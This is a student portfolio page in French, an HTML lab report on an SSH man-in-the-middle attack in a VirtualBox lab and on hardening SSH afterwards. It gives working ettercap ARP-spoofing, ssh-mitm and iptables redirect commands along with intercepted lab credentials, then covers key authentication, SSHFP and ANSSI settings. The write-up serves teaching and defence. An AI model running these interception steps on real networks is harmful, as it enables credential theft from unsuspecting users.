@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Projet SSH - Sécurité, Attaque MITM et Durcissement - Portfolio BTS SIO</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .full-width {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .cr-header {
+            margin-bottom: 2rem;
+            padding-bottom: 1rem;
+            border-bottom: 3px solid #0d6efd;
+        }
+        
+        .cr-header h1 {
+            font-size: 2rem;
+            margin-bottom: 0.5rem;
+            color: #0d6efd;
+        }
+        
+        .cr-header .meta {
+            color: #6c757d;
+            font-size: 0.9rem;
+        }
+        
+        .btn-back {
+            display: inline-block;
+            margin-bottom: 1.5rem;
+            background: #e9ecef;
+            padding: 0.5rem 1rem;
+            border-radius: 30px;
+            text-decoration: none;
+            color: #0d6efd;
+            font-size: 0.9rem;
+        }
+        
+        .btn-back:hover {
+            background: #dee2e6;
+        }
+        
+        .section-cr {
+            background: white;
+            border-radius: 20px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+        
+        .section-cr h2 {
+            border-left: 4px solid #0d6efd;
+            padding-left: 1rem;
+            margin-top: 0;
+            margin-bottom: 1.5rem;
+        }
+        
+        .section-cr h3 {
+            margin-top: 1.5rem;
+            margin-bottom: 0.75rem;
+            color: #343a40;
+        }
+        
+        .section-cr h4 {
+            margin-top: 1rem;
+            margin-bottom: 0.5rem;
+            color: #495057;
+        }
+        
+        .code-block {
+            background: #f4f4f4;
+            color: #1e1e1e;
+            padding: 1rem;
+            border-radius: 12px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            overflow-x: auto;
+            margin: 1rem 0;
+            border: 1px solid #ddd;
+        }
+        
+        .test-ok {
+            background: #d1e7dd;
+            color: #0f5132;
+            padding: 0.5rem 1rem;
+            border-radius: 10px;
+            display: inline-block;
+            margin: 0.5rem 0;
+        }
+        
+        .test-ko {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 0.5rem 1rem;
+            border-radius: 10px;
+            display: inline-block;
+            margin: 0.5rem 0;
+        }
+        
+        .warning {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 0.5rem 1rem;
+            margin: 1rem 0;
+            border-radius: 8px;
+        }
+        
+        .alert {
+            background: #f8d7da;
+            border-left: 4px solid #dc3545;
+            padding: 0.5rem 1rem;
+            margin: 1rem 0;
+            border-radius: 8px;
+        }
+        
+        .info {
+            background: #cfe2ff;
+            border-left: 4px solid #0d6efd;
+            padding: 0.5rem 1rem;
+            margin: 1rem 0;
+            border-radius: 8px;
+        }
+        
+        .table-container {
+            overflow-x: auto;
+            margin: 1rem 0;
+        }
+        
+        .cr-table {
+            width: 100%;
+            border-collapse: collapse;
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid #dee2e6;
+        }
+        
+        .cr-table th,
+        .cr-table td {
+            padding: 0.75rem 1rem;
+            text-align: left;
+            border-bottom: 1px solid #dee2e6;
+            background: white;
+        }
+        
+        .cr-table th {
+            background: #e9ecef;
+            font-weight: 600;
+        }
+        
+        .cr-table tr:last-child td {
+            border-bottom: none;
+        }
+        
+        .toc {
+            background: #f8f9fa;
+            padding: 1rem 2rem;
+            border-radius: 16px;
+            margin-bottom: 2rem;
+            border: 1px solid #e9ecef;
+        }
+        
+        .toc a {
+            text-decoration: none;
+            color: #0d6efd;
+        }
+        
+        .toc a:hover {
+            text-decoration: underline;
+        }
+        
+        .toc ul {
+            margin-top: 0.5rem;
+            margin-bottom: 0;
+        }
+        
+        .toc li {
+            margin-bottom: 0.25rem;
+        }
+        
+        blockquote {
+            background: #f8f9fa;
+            border-left: 4px solid #0d6efd;
+            padding: 0.5rem 1rem;
+            margin: 1rem 0;
+            border-radius: 8px;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 2rem;
+            color: #6c757d;
+            font-size: 0.8rem;
+        }
+        
+        .pdf-image {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin: 1rem 0;
+        }
+    </style>
+</head>
+<body>
+<div class="layout">
+    <aside class="sidebar">
+        <div class="profile">
+            <h2>⚙️ Wilga Axel</h2>
+            <p>BTS SIO SISR · Infrastructure & Réseaux</p>
+        </div>
+        <ul class="nav-links">
+            <li><a href="index.html">🏠 Accueil</a></li>
+            <li><a href="profil.html">👤 Profil</a></li>
+            <li><a href="competences.html">📚 Compétences</a></li>
+            <li><a href="projets.html" class="active">📂 Projets</a></li>
+            <li><a href="certifications.html">🎓 Certifications</a></li>
+            <li><a href="experiences.html">💼 Expériences</a></li>
+            <li><a href="veille.html">🔍 Veille technologique</a></li>
+            <li><a href="contact.html">✉️ Contact</a></li>
+        </ul>
+        <div class="sidebar-footer">
+            Portfolio BTS SIO — 2025/2026
+        </div>
+    </aside>
+
+    <main class="main-content" style="padding: 2rem;">
+        <div class="full-width">
+            <a href="projets.html" class="btn-back">← Retour aux projets</a>
+
+            <div class="cr-header">
+                <h1>🔐 TP SSH – Sécurité, Attaque MITM et Durcissement</h1>
+                <div class="meta">Auteur : Wilga Axel | Date : Mai 2026 | Objectif : Comprendre les faiblesses de SSH face aux attaques MITM et mettre en place des contre-mesures efficaces</div>
+            </div>
+
+            <!-- ========== TABLE DES MATIÈRES ========== -->
+            <div class="toc">
+                <strong>📑 Table des matières</strong>
+                <ul>
+                    <li><a href="#intro">1. Introduction et objectifs</a></li>
+                    <li><a href="#infra">2. Mise en place de l'infrastructure virtuelle</a></li>
+                    <li><a href="#decouverte">3. Découverte du réseau et des services</a></li>
+                    <li><a href="#mitm">4. Mise en place de l'attaque MITM</a>
+                        <ul>
+                            <li><a href="#mitm-install">4.1. Installation de ssh-mitm</a></li>
+                            <li><a href="#mitm-ettercap">4.2. ARP spoofing avec Ettercap</a></li>
+                            <li><a href="#mitm-intercept">4.3. Interception des identifiants</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="#detection">5. Détection de l'attaque par le client</a></li>
+                    <li><a href="#securisation">6. Sécurisation du serveur SSH</a>
+                        <ul>
+                            <li><a href="#securisation-cles">6.1. Authentification par clé publique</a></li>
+                            <li><a href="#securisation-mdp">6.2. Désactivation du mot de passe</a></li>
+                            <li><a href="#securisation-sshfp">6.3. Renforcement avec SSHFP (DNS)</a></li>
+                            <li><a href="#securisation-anssi">6.4. Durcissement selon l'ANSSI</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="#problemes">7. Problèmes rencontrés et solutions</a></li>
+                    <li><a href="#conclusion">8. Conclusion</a></li>
+                </ul>
+            </div>
+
+            <!-- ========== SECTION 1 : INTRODUCTION ========== -->
+            <div class="section-cr" id="intro">
+                <h2>1. Introduction et objectifs</h2>
+                <p>Ce TP avait pour but de comprendre les faiblesses du protocole SSH face aux attaques de type MITM (Man-In-The-Middle), puis de mettre en place des contre-mesures efficaces.</p>
+                <p>L'infrastructure simulée comprend quatre machines virtuelles :</p>
+                <ul>
+                    <li><strong>srvssh</strong> : serveur SSH + serveur DNS</li>
+                    <li><strong>clissh</strong> : client légitime</li>
+                    <li><strong>kali</strong> : attaquant</li>
+                    <li><strong>rwbsd</strong> : routeur (passerelle par défaut)</li>
+                </ul>
+                <p><strong>Objectifs pédagogiques :</strong></p>
+                <ol>
+                    <li>Configurer un réseau host-only avec VirtualBox.</li>
+                    <li>Scanner un réseau et découvrir les services avec Nmap.</li>
+                    <li>Comprendre le principe de l'attaque MITM (ARP spoofing + redirection de ports).</li>
+                    <li>Intercepter des identifiants SSH en clair avec <code>ssh-mitm</code>.</li>
+                    <li>Comprendre l'avertissement de changement de clé d'hôte.</li>
+                    <li>Mettre en place l'authentification par clé publique.</li>
+                    <li>Désactiver l'authentification par mot de passe.</li>
+                    <li>Utiliser les enregistrements SSHFP dans le DNS pour vérifier automatiquement les clés d'hôte.</li>
+                    <li>Appliquer les recommandations de durcissement SSH de l'ANSSI.</li>
+                </ol>
+            </div>
+
+            <!-- ========== SECTION 2 : INFRASTRUCTURE ========== -->
+            <div class="section-cr" id="infra">
+                <h2>2. Mise en place de l'infrastructure virtuelle</h2>
+                
+                <h3>2.1 Importation des VM</h3>
+                <p>Le fichier <code>tpSSH-Certa.ova</code> a été téléchargé puis importé dans VirtualBox :</p>
+                <div class="code-block">
+VirtualBox → Fichier → Importer un appareil virtuel
+                </div>
+                <p>Les quatre machines suivantes ont été importées :</p>
+                <div class="table-container">
+                    <table class="cr-table">
+                        <thead>
+                            <tr><th>Machine</th><th>Rôle</th></tr>
+                        </thead>
+                        <tbody>
+                            <tr><td><strong>srvssh</strong></td><td>Serveur SSH + DNS</strong> </tr>
+                            <tr>
+                                <td><strong>clissh</strong> <td>Client SSH</strong> </tr>
+                            <tr>
+                                <td><strong>kali</strong> <td>Attaquant (outils de penetration test)</strong> </tr>
+                            <tr>
+                                <td><strong>rwbsd</strong> <td>Routeur / passerelle</strong> </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h3>2.2 Configuration du réseau host-only</h3>
+                <p>Un réseau host-only nommé <code>vboxnet0</code> a été configuré :</p>
+                <div class="code-block">
+VirtualBox → Fichier → Gestionnaire de réseau hôte
+                </div>
+                <p>Paramètres :</p>
+                <ul>
+                    <li><strong>Adresse IP</strong> : <code>192.168.56.1/24</code></li>
+                    <li><strong>DHCP</strong> : désactivé (les IPs sont statiques)</li>
+                </ul>
+                <p>Toutes les VM ont été configurées pour utiliser <code>vboxnet0</code> comme interface réseau principale.</p>
+
+                <h3>2.3 Plan d'adressage IP</h3>
+                <p>Chaque VM a reçu une adresse IP statique :</p>
+                <div class="table-container">
+                    <table class="cr-table">
+                        <thead>
+                            <tr><th>Machine</th><th>Adresse IP</th></tr>
+                        </thead>
+                        <tbody>
+                            <tr><td>srvssh</strong> <td>192.168.56.10</strong> </tr>
+                            <tr>
+                                <td>clissh</strong> <td>192.168.56.11</strong> </tr>
+                            <tr>
+                                <td>kali</strong> <td>192.168.56.12</strong> </tr>
+                            <tr>
+                                <td>rwbsd</strong> <td>192.168.56.254</strong> </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h3>2.4 Test de connectivité</h3>
+                <p>Depuis <code>clissh</code>, tentative de connexion SSH au serveur :</p>
+                <div class="code-block">
+ssh etusio@192.168.56.10
+                </div>
+                <div class="alert">
+                    <strong>⚠️ Message d'avertissement :</strong><br>
+                    The authenticity of host 'srvssh.local.sio.fr (192.168.56.10)' can't be established.<br>
+                    ECDSA key fingerprint is SHA256:lPIxEKxsYHPP3i7iMiZZXLYUoW9viLwSfF39MNoWlM4.<br>
+                    Are you sure you want to continue connecting (yes/no)?
+                </div>
+                <p><strong>Explication</strong> : Le client n'a jamais rencontré ce serveur. Aucune clé d'hôte n'est présente dans <code>known_hosts</code>. SSH ne peut donc pas vérifier l'identité du serveur.</p>
+                <p>Emplacement du fichier <code>known_hosts</code> :</p>
+                <div class="code-block">
+/home/etusio/.ssh/known_hosts
+                </div>
+                <p>Pour les besoins du TP, ce fichier a été vidé :</p>
+                <div class="code-block">
+echo > ~/.ssh/known_hosts
+                </div>
+            </div>
+
+            <!-- ========== SECTION 3 : DÉCOUVERTE ========== -->
+            <div class="section-cr" id="decouverte">
+                <h2>3. Découverte du réseau et des services</h2>
+                <p>Depuis la machine <strong>kali</strong> (l'attaquant), nous avons utilisé <code>nmap</code> pour découvrir les machines présentes sur le réseau et les services qu'elles exposent.</p>
+
+                <h3>3.1 Découverte des hôtes</h3>
+                <div class="code-block">
+nmap -sP 192.168.56.0/24
+                </div>
+                <div class="test-ok">✅ Cette commande (ping scan) a révélé toutes les machines actives sur le réseau : srvssh, clissh, rwbsd et kali elle-même.</div>
+
+                <h3>3.2 Scan des services</h3>
+                <div class="code-block">
+nmap -sV 192.168.56.10   # srvssh
+nmap -sV 192.168.56.11   # clissh
+nmap -sV 192.168.56.254  # rwbsd
+                </div>
+                <p><strong>Résultats constatés :</strong></p>
+                <ul>
+                    <li><strong>srvssh</strong> : port 22 (SSH) ouvert</li>
+                    <li><strong>clissh</strong> : pas de service particulier</li>
+                    <li><strong>rwbsd</strong> : probablement aucun service SSH</li>
+                </ul>
+                <div class="test-ok">✅ L'attaquant identifie une cible intéressante : le serveur SSH sur <code>192.168.56.10</code>.</div>
+            </div>
+
+            <!-- ========== SECTION 4 : ATTAQUE MITM ========== -->
+            <div class="section-cr" id="mitm">
+                <h2>4. Mise en place de l'attaque MITM</h2>
+                <p>L'attaque MITM (Man-In-The-Middle) consiste à s'interposer entre le client et le serveur pour :</p>
+                <ol>
+                    <li>Tromper leurs tables ARP (ARP spoofing)</li>
+                    <li>Intercepter, lire et relayer les paquets</li>
+                    <li>Détourner le flux SSH pour voler les identifiants</li>
+                </ol>
+
+                <h3 id="mitm-install">4.1 Installation de ssh-mitm sur Kali</h3>
+                <p><code>ssh-mitm</code> est un outil qui intercepte les connexions SSH en se faisant passer pour le serveur légitime.</p>
+                <div class="code-block">
+git clone https://github.com/ktux/ssh-mitm
+cd ssh-mitm/
+export LANG=en_US.utf-8
+sudo ./install.sh
+                </div>
+                <p>Pendant l'installation, nous avons accepté la configuration d'<strong>AppArmor</strong> pour restreindre les droits du processus <code>ssh-mitm</code> (bonne pratique de sécurité).</p>
+
+                <h3>4.2 Lancement de ssh-mitm</h3>
+                <div class="code-block">
+sudo ./start.sh
+                </div>
+                <p>Ce script active automatiquement :</p>
+                <ul>
+                    <li><strong>Le routage IP</strong> (forwarding) sur Kali</li>
+                    <li><strong>Une redirection de port</strong> : toute connexion destinée au port 22 est redirigée vers le port 2222, où écoute <code>ssh-mitm</code></li>
+                </ul>
+                <p>La règle iptables créée est équivalente à :</p>
+                <div class="code-block">
+iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
+                </div>
+
+                <h3 id="mitm-ettercap">4.3 ARP spoofing avec Ettercap</h3>
+                <p>Pour que tout le trafic entre <code>clissh</code> et <code>srvssh</code> passe par Kali, nous empoisonnons les tables ARP.</p>
+                <div class="code-block">
+sudo ettercap -i eth0 -T -M arp:remote /192.168.56.10// /192.168.56.11//
+                </div>
+                <ul>
+                    <li><code>-i eth0</code> : interface réseau</li>
+                    <li><code>-T</code> : mode texte</li>
+                    <li><code>-M arp:remote</code> : attaque ARP spoofing</li>
+                    <li><code>/192.168.56.10//</code> : cible 1 (serveur)</li>
+                    <li><code>/192.168.56.11//</code> : cible 2 (client)</li>
+                </ul>
+                <div class="alert">
+                    <strong>Résultat</strong> : Kali annonce au client qu'il est le serveur, et au serveur qu'il est le client. Tous les paquets transitent donc par Kali.
+                </div>
+
+                <h4>Vérification de l'attaque</h4>
+                <p><strong>Vérification du cache ARP (client ou serveur) :</strong></p>
+                <div class="code-block">
+ip neigh show
+                </div>
+                <div class="test-ok">✅ On observe que l'adresse MAC associée à l'autre machine a changé : elle correspond désormais à celle de Kali.</div>
+
+                <h3 id="mitm-intercept">4.4 Interception des identifiants</h3>
+                <p>Lorsque l'utilisateur légitime (sur <code>clissh</code>) tente de se connecter :</p>
+                <div class="code-block">
+ssh etusio@192.168.56.10
+                </div>
+                <p>Le message classique du fingerprint inconnu s'affiche (car le <code>known_hosts</code> a été vidé). L'utilisateur accepte, puis tape son mot de passe.</p>
+                <p><strong>Sur Kali</strong>, <code>ssh-mitm</code> enregistre précieusement :</p>
+                <ul>
+                    <li>Le login et le mot de passe dans <code>/var/log/auth.log</code> :</li>
+                </ul>
+                <div class="code-block">
+Nov 7 14:11:49 kali sshd_mitm[1160]: INTERCEPTED PASSWORD: hostname: [192.168.56.10]; username: [etusio]; password: [Fghijkl1234*] [preauth]
+                </div>
+                <ul>
+                    <li>Toutes les commandes tapées pendant la session dans <code>/home/ssh-mitm/shell_session_0.txt</code> :</li>
+                </ul>
+                <div class="code-block">
+Time : 2025-11-07 13:11:49 GMT
+Server : 192.168.56.10:22
+Client : 192.168.56.11:36486
+Username : etusio
+Password : Fghijkl1234*
+...
+                </div>
+                <div class="test-ko">✅ L'attaque est une réussite : l'attaquant possède désormais les identifiants de l'utilisateur <code>etusio</code>.</div>
+            </div>
+
+            <!-- ========== SECTION 5 : DÉTECTION ========== -->
+            <div class="section-cr" id="detection">
+                <h2>5. Détection de l'attaque par le client</h2>
+                <p>Après l'attaque, nous avons vidé le cache ARP sur <code>clissh</code> pour effacer l'empoisonnement, puis tenté une nouvelle connexion :</p>
+                <div class="code-block">
+sudo ip neigh flush all
+ssh etusio@192.168.56.10
+                </div>
+                <div class="alert">
+                    <strong>⚠️ Avertissement :</strong><br>
+                    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br>
+                    @    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @<br>
+                    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br>
+                    IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!<br>
+                    Someone could be eavesdropping on you right now (man-in-the-middle attack)!<br>
+                    It is also possible that a host key has just been changed.
+                </div>
+                <p><strong>Explication :</strong></p>
+                <ul>
+                    <li>Le client avait enregistré la clé du <strong>véritable</strong> serveur lors de la première connexion (malgré l'attaque, c'était la vraie clé).</li>
+                    <li>Lors de la seconde tentative, l'attaquant (<code>ssh-mitm</code>) présente sa <strong>propre clé</strong> (car il termine la connexion TLS/SSH).</li>
+                    <li>Le client compare la clé reçue avec celle stockée dans <code>known_hosts</code> : elles sont différentes.</li>
+                    <li>SSH en déduit qu'une attaque MITM est potentiellement en cours et refuse la connexion.</li>
+                </ul>
+                <div class="test-ok">✅ Ce mécanisme est la <strong>protection par défaut contre les attaques MITM sur SSH</strong>. Malheureusement, si l'utilisateur n'a jamais accepté la vraie clé auparavant (cas de la première connexion), l'avertissement n'apparaît pas et l'attaque réussit.</div>
+            </div>
+
+            <!-- ========== SECTION 6 : SÉCURISATION ========== -->
+            <div class="section-cr" id="securisation">
+                <h2>6. Sécurisation du serveur SSH</h2>
+
+                <h3 id="securisation-cles">6.1 Authentification par clé publique</h3>
+                <p>L'authentification par clé publique supprime le besoin de taper un mot de passe à chaque connexion, rendant l'attaque MITM inefficace pour voler des identifiants (pas de mot de passe à intercepter).</p>
+                
+                <h4>Sur le serveur (<code>srvssh</code>) : activation des clés publiques</h4>
+                <p>Édition de <code>/etc/ssh/sshd_config</code> :</p>
+                <div class="code-block">
+sudoedit /etc/ssh/sshd_config
+                </div>
+                <p>Décommenter / ajouter :</p>
+                <div class="code-block">
+PubkeyAuthentication yes
+AuthorizedKeysFile .ssh/authorized_keys
+                </div>
+                <p>Redémarrage du service :</p>
+                <div class="code-block">
+sudo service ssh restart
+                </div>
+
+                <h4>Sur le client (<code>clissh</code>) : génération d'une paire de clés</h4>
+                <div class="code-block">
+ssh-keygen -b 256 -t ecdsa
+                </div>
+                <p>Passphrase utilisée (pour le TP) : <code>TPMITMcerta</code></p>
+
+                <h4>Envoi de la clé publique au serveur</h4>
+                <div class="code-block">
+ssh-copy-id -i ~/.ssh/id_ecdsa.pub etusio@192.168.56.10
+                </div>
+                <div class="test-ok">✅ Après cette opération, la connexion s'effectue sans mot de passe (juste la passphrase de la clé privée, ou pas de passphrase si on l'a laissée vide).</div>
+
+                <h3 id="securisation-mdp">6.2 Désactivation de l'authentification par mot de passe</h3>
+                <p>Sur le serveur (<code>srvssh</code>), modification de <code>/etc/ssh/sshd_config</code> :</p>
+                <div class="code-block">
+PasswordAuthentication no
+                </div>
+                <p>Puis :</p>
+                <div class="code-block">
+sudo service ssh restart
+                </div>
+                <div class="test-ok">✅ Désormais, l'attaquant ne peut plus voler de mot de passe, car l'authentification par mot de passe est tout simplement désactivée. Seuls ceux qui possèdent la clé privée peuvent se connecter.</div>
+
+                <h3 id="securisation-sshfp">6.3 Renforcement avec DNS SSHFP</h3>
+                <p>Les enregistrements SSHFP (SSH Fingerprint) dans le DNS permettent au client de vérifier automatiquement la clé d'hôte du serveur sans dépendre du <code>known_hosts</code>.</p>
+
+                <h4>Sur le serveur : génération des empreintes</h4>
+                <div class="code-block">
+sudo ssh-keygen -r srvssh
+                </div>
+                <p>Cette commande produit des lignes au format :</p>
+                <div class="code-block">
+srvssh IN SSHFP 1 1 1234567890ABCDEF...
+srvssh IN SSHFP 2 1 67890ABCDEF12345...
+                </div>
+
+                <h4>Ajout dans la zone DNS</h4>
+                <p>Fichier <code>/var/named/db.local.sio.fr</code> :</p>
+                <div class="code-block">
+$ORIGIN local.sio.fr.
+srvssh    IN A      192.168.56.10
+          IN SSHFP  1 1 1234567890ABCDEF...
+          IN SSHFP  2 1 67890ABCDEF12345...
+                </div>
+                <p>Rechargement de Bind9 :</p>
+                <div class="code-block">
+sudo service bind9 reload
+                </div>
+
+                <h4>Côté client : vérification automatique</h4>
+                <div class="code-block">
+ssh -o VerifyHostKeyDNS=true etusio@192.168.56.10
+                </div>
+                <div class="test-ok">✅ Le client interroge le DNS, récupère les empreintes SSHFP, les compare avec la clé reçue et accepte automatiquement la connexion sans aucun avertissement (si tout est cohérent).</div>
+                <p><strong>Avantage</strong> : Même si <code>known_hosts</code> est vide, le client peut vérifier la clé du serveur via une source fiable (DNS, si celui-ci est sécurisé). En entreprise, cela évite les demandes d'acceptation de clé manuelles.</p>
+
+                <h3 id="securisation-anssi">6.4 Durcissement complet selon l'ANSSI</h3>
+                <p>L'ANSSI (Agence Nationale de la Sécurité des Systèmes d'Information) publie des recommandations pour la configuration sécurisée de SSH. Nous avons appliqué les plus importantes dans <code>/etc/ssh/sshd_config</code> :</p>
+                
+                <div class="table-container">
+                    <table class="cr-table">
+                        <thead>
+                            <tr><th>Directive</th><th>Valeur</th><th>Explication</th></tr>
+                        </thead>
+                        <tbody>
+                            <tr><td><code>PermitRootLogin</code></strong> <td><code>no</code> <td>Interdit la connexion directe de root (privilège à prendre via <code>su</code> ou <code>sudo</code>)</strong> </tr>
+                            </table>
+                                <td><code>Protocol</code> <td><code>2</code> <td>N'utilise que la version 2 du protocole (la version 1 est vulnérable)</strong> </tr>
+                            <tr>
+                                <td><code>Port</code> <td><code>222</code> <td>Change le port SSH par défaut (réduit le bruit des scanners automatiques)</strong> </tr>
+                            <tr>
+                                <td><code>AllowUsers</code> <td><code>etusio</code> <td>Seul l'utilisateur <code>etusio</code> peut se connecter (moins de surface d'attaque)</strong> </tr>
+                            <tr>
+                                <td><code>PermitEmptyPasswords</code> <td><code>no</code> <td>Interdit les comptes sans mot de passe (redondant avec <code>PasswordAuthentication no</code>)</strong> </tr>
+                            <tr>
+                                <td><code>MaxAuthTries</code> <td><code>3</code> <td>Limite à 3 tentatives d'authentification avant déconnexion (ralentit le brute force)</strong> </tr>
+                            <tr>
+                                <td><code>Sandbox</code> <td><code>yes</code> <td>Active un environnement restreint avant authentification (réduit l'exposition)</strong> </tr>
+                            <tr>
+                                <td><code>PrintLastLog</code> <td><code>yes</code> <td>Affiche la date de la dernière connexion (alerte l'utilisateur en cas d'intrusion)</strong> </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="code-block">
+sudo service ssh restart
+                </div>
+                <div class="warning">
+                    <strong>⚠️ Remarque</strong> : Après avoir changé le port de 22 à 222, les clients doivent désormais se connecter avec :<br>
+                    <code>ssh -p 222 etusio@192.168.56.10</code>
+                </div>
+            </div>
+
+            <!-- ========== SECTION 7 : PROBLÈMES RENCONTRÉS ========== -->
+            <div class="section-cr" id="problemes">
+                <h2>7. Problèmes rencontrés et solutions</h2>
+                <div class="table-container">
+                    <table class="cr-table">
+                        <thead>
+                            <tr><th>Problème</th><th>Cause</th><th>Solution</th></tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Impossible de se connecter en SSH après importation des VM</strong> <td>
+                                <td>Les VM n'ont pas la bonne configuration réseau ou le serveur SSH n'est pas démarré</strong> <td>
+                                <td>Vérifier que toutes les VM sont sur le même réseau host-only et que <code>ssh</code> est actif (<code>systemctl status ssh</code>)</strong> </tr>
+                            <tr>
+                                <td><strong>Le client détecte un changement de clé après la première connexion légitime</strong> <td>
+                                <td>C'est normal : la clé du serveur s'est effectivement enregistrée dans <code>known_hosts</code></strong> <td>
+                                <td>Utiliser ce mécanisme pour comprendre la protection contre MITM. Effacer <code>known_hosts</code> pour simuler une première connexion</strong> </tr>
+                            <tr>
+                                <td><strong>ssh-mitm plante pendant l'installation (locale fr)</strong> <td>
+                                <td>Problème de locale (UTF-8)</strong> <td>
+                                <td>Exécuter <code>export LANG=en_US.utf-8</code> avant <code>./install.sh</code></strong> </tr>
+                            </tr>
+                                <td><strong>Après désactivation du mot de passe, plus personne ne peut se connecter</strong> <td>
+                                <td>La clé publique n'a pas été correctement copiée dans <code>authorized_keys</code></strong> <td>
+                                <td>Se connecter en local sur <code>srvssh</code> (depuis VirtualBox) et vérifier <code>/home/etusio/.ssh/authorized_keys</code></strong> </tr>
+                            <tr>
+                                <td><strong>Le client n'utilise pas le DNS pour vérifier SSHFP</strong> <td>
+                                <td>L'option <code>VerifyHostKeyDNS</code> est <code>false</code> par défaut</strong> <td>
+                                <td>Utiliser <code>ssh -o VerifyHostKeyDNS=true</code> ou ajouter la directive dans <code>~/.ssh/config</code></strong> </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- ========== SECTION 8 : CONCLUSION ========== -->
+            <div class="section-cr" id="conclusion">
+                <h2>8. Conclusion</h2>
+                <p>Ce TP a couvert l'ensemble du cycle de vie d'une attaque MITM sur SSH, de la découverte réseau à l'interception d'identifiants, en passant par la détection et le durcissement.</p>
+
+                <h3>Ce que nous avons appris :</h3>
+                <ol>
+                    <li><strong>Configuration réseau</strong> : Mise en place d'un réseau host-only VirtualBox avec adressage statique.</li>
+                    <li><strong>Scan et découverte</strong> : Utilisation de Nmap pour cartographier un réseau et identifier les services vulnérables.</li>
+                    <li><strong>Attaque MITM avec ARP spoofing</strong> : Empoisonnement des tables ARP avec Ettercap, redirection des connexions SSH avec <code>ssh-mitm</code>, interception des identifiants et des commandes.</li>
+                    <li><strong>Protection contre le MITM</strong> : Le mécanisme <code>known_hosts</code> détecte un changement de clé d'hôte et alerte l'utilisateur.</li>
+                    <li><strong>Authentification par clé publique</strong> : Suppression du mot de passe, rendant l'attaque MITM inefficace pour le vol d'identifiants.</li>
+                    <li><strong>Vérification DNS (SSHFP)</strong> : Utilisation des enregistrements DNS pour authentifier automatiquement les clés d'hôte (sans <code>known_hosts</code> local).</li>
+                    <li><strong>Durcissement ANSSI</strong> : Application des bonnes pratiques (port non standard, limitation des utilisateurs, sandbox, etc.).</li>
+                </ol>
+
+                <h3>Points clés à retenir pour l'avenir :</h3>
+                <ul>
+                    <li><strong>Toujours vérifier les fingerprints</strong> lors d'une première connexion SSH (ne jamais accepter aveuglément).</li>
+                    <li><strong>Privilégier l'authentification par clé publique</strong> et désactiver le mot de passe.</li>
+                    <li><strong>Utiliser SSHFP dans le DNS</strong> dans les environnements où l'on contrôle le DNS (évite de gérer manuellement <code>known_hosts</code>).</li>
+                    <li><strong>Changer le port SSH</strong> n'est pas une sécurité en soi (un port scan le découvre), mais cela réduit le bruit des attaques automatisées.</li>
+                    <li><strong>Les attaques MITM réelles existent</strong> (sur Wi-Fi public, réseau d'entreprise compromis, etc.). La vigilance et les bonnes configurations sont essentielles.</li>
+                </ul>
+            </div>
+        </div>
+        <footer>
+            Portfolio BTS SIO SISR – Wilga Axel – Projet SSH – Mai 2026
+        </footer>
+    </main>
+</div>
+</body>
+</html>
